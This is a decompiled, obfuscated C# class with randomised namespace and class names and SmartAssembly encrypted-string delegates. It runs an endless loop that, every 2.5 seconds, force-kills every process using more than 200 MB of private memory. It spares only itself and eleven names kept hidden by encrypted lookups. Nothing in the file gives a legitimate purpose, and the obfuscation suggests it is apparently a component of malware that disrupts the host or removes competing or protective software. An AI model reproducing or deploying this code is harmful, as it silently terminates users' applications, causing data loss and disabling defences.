using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace sWduCclqEzKrM;

public static class kNzrhOLlcaFRCSu
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void YrogIvJmHUoS()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107375941)) && !process.ProcessName.Contains(getString_0(107375932)) && !process.ProcessName.Contains(getString_0(107375891)) && !process.ProcessName.Contains(getString_0(107375882)) && !process.ProcessName.Contains(getString_0(107375901)) && !process.ProcessName.Contains(getString_0(107375856)) && !process.ProcessName.Contains(getString_0(107375875)) && !process.ProcessName.Contains(getString_0(107376342)) && !process.ProcessName.Contains(getString_0(107376329)) && !process.ProcessName.Contains(getString_0(107376348)) && !process.ProcessName.Contains(getString_0(107376295)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static kNzrhOLlcaFRCSu()
	{
		Strings.CreateGetStringDelegate(typeof(kNzrhOLlcaFRCSu));
	}
}
